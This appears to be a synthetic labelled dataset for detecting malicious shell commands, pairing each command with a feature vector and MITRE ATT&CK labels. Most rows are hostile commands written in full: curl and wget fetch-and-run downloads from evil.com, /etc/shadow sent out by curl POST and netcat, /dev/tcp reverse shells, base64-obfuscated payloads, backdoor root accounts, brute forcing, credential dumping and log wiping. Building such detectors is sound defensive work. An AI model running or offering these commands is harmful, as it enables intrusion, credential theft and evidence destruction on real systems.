cat  /etc/passwd  |  awk  -F:  '$3  >=  1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZSgnaHR0cDovL2V2aWwuY29tL3BheWxvYWQnLCAnL3RtcC9wYXlsb2FkJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
su  -s  /bin/bash  www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'bHMgLWxhIC9yb290IC9ldGMgL3Zhci93d3cgfCA+IC9kZXYvbnVsbCAyPiYx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
echo  'YWRkdXNlciAtLXNoZWxsIC9iaW4vYmFzaCAtLWRpc2FibGVkLXBhc3N3b3JkIGJhY2tkb29y'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
groups,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
xfreerdp /u:Administrator /p:Password123 /v:10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
nohup echo 'Z2V0ZW50IGdyb3VwIHN1ZG8=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
"bash -c ""cat /proc/version""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1082_System_Information_Discovery'],synthetic
time reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bmJ0c2NhbiAxOTIuMTY4LjEuMC8yNCA7IHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost ; echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.64, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
lsb_release -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
echo 'Zm9yIGkgaW4gJChzZXEgMSAyNTQpOyBkbyBwaW5nIC1jMSAtVzEgMTkyLjE2OC4wLiRpICY+L2Rldi9udWxsICYmIGVjaG8gMTkyLjE2OC4wLiRpOyBkb25l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""crontab -e""","[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1110_Brute_Force'],synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""' && > /dev/null 2>&1","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.48, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""cat /etc/passwd | awk -F: '$3 >= 1000'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1087_Account_Discovery'],synthetic
ip neigh show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
service apache2 status,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
sudo wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.56, 1, 1]",['T1496_Resource_Hijacking'],synthetic
who ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 1, 1]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcLi4uJyAtTmFtZSBQZXJzaXN0IC1WYWx1ZSAnQzpccGF5bG9hZC5leGUn' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
xfreerdp  /u:Administrator  /p:Password123  /v:10.0.0.5  ;  >  /dev/null  2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
"bash -c ""ncrack -p 22 --user root -P pass.lst 10.0.0.1""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1110_Brute_Force'],synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nmap -sn 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
echo 'ZmluZCAvIC1uYW1lICcqLnBlbScgMj4vZGV2L251bGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
"php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
time echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuOTkvNDQ0NCAwPiYxIHwgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'c21iY2xpZW50IC8vMTAuMC4wLjUvQyQgLVUgQWRtaW5pc3RyYXRvcg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
nmap -sn 192.168.1.0/24 | sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.24, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
xfreerdp /u:Administrator /p:Password123 /v:10.0.0.5 && > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo unset HISTFILE; export HISTSIZE=0,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1070_Indicator_Removal'],synthetic
journalctl -u ssh --since today,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
ls -la /home/user,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow | echo done,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'ZmluZCAvIC1uYW1lICcqLnBlbScgMj4vZGV2L251bGwgfCBoaXN0b3J5IC1j' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'c2hyZWQgLXUgL3Zhci9sb2cvYXV0aC5sb2c='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
"bash -c ""w""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
sudo echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlciA7IGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
whoami /all | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.24, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
"bash -c ""hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
nohup echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
echo 'ZmluZCAvaG9tZSAtbmFtZSAnLmVudicgMj4vZGV2L251bGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
uname -a && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.0, 0.24, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
grep -r 'password' /var/www/html --include='*.php',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'ZWNobyAnKi81ICogKiAqICogY3VybCBodHRwOi8vYzIuY29tL2JlYWNvbicgfCBjcm9udGFiIC0=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
shred -u /var/log/auth.log ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c 'import socket,subprocess,os;...'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
useradd  -m  -s  /bin/bash  hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
journalctl -u ssh --since today,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
arp-scan --localnet,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
cat /etc/os-release,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
adduser --shell /bin/bash --disabled-password backdoor ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'd21pYyB1c2VyYWNjb3VudCBsaXN0IHwgZWNobyBkb25l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
"bash -c ""for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.6, 0, 0]",['T1110_Brute_Force'],synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow ; > /dev/null 2>&1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"time nmap -sV -p 22,80,443 10.0.0.0/24 | echo done","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.36, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nbtscan  192.168.1.0/24  ;  echo  done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup uptime &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
"bash -c ""echo 'cnVudXNlciAtbCBwb3N0Z3JlcyAtYyAncHNxbCAtYyAiU0VMRUNUIHBnX3JlYWRfZmlsZShcJy9ldGMvcGFzc3dkXCcpIic=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
sudo echo 'bG4gLXMgL3RtcC9iYWNrZG9vci5zaCAvZXRjL2Nyb24uZC9zeXN0ZW0tdXBkYXRl' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'bmV0IHVzZXIgL2FkZCBhdHRhY2tlciBQQHNzdzByZCB8ID4gL2Rldi9udWxsIDI+JjE='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
nohup echo 'bm1hcCAtc1YgLS12ZXJzaW9uLWludGVuc2l0eSA1IC1wIDEtNjU1MzUgMTAuMC4wLjE=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
ls -la /root /etc /var/www | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./CVE-2021-4034 ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
smbclient //10.0.0.5/C$ -U Administrator,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
unset HISTFILE; export HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
curl -sL http://evil.com/shell.sh -o /tmp/shell.sh,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
cat /proc/version ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find /home -name '.env' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
last -n 10,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
echo 'dW5zZXQgSElTVEZJTEU7IGV4cG9ydCBISVNUU0laRT0w' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo arp-scan --localnet,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
net  user  /add  attacker  P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
nohup uname -a &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1082_System_Information_Discovery'],synthetic
find / -perm -4000 -type f 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
nohup ssh user@192.168.1.10 'ls' &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]",['T1496_Resource_Hijacking'],synthetic
procdump.exe  -ma  lsass.exe  lsass.dmp  &&  >  /dev/null  2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
Get-LocalGroupMember -Group Administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd && echo done,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
perl -e 'use Socket; ...',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"bash -c ""wmic useraccount list""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
echo 'Zm9yIGkgaW4gJChzZXEgMSAyNTQpOyBkbyBwaW5nIC1jMSAtVzEgMTkyLjE2OC4wLiRpICY+L2Rldi9udWxsICYmIGVjaG8gMTkyLjE2OC4wLiRpOyBkb25l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup ssh -i ~/.ssh/stolen_key root@10.0.0.5 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1021_Remote_Services'],synthetic
sudo echo 'bmV0IHVzZXIgL2FkZCBhdHRhY2tlciBQQHNzdzByZA==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
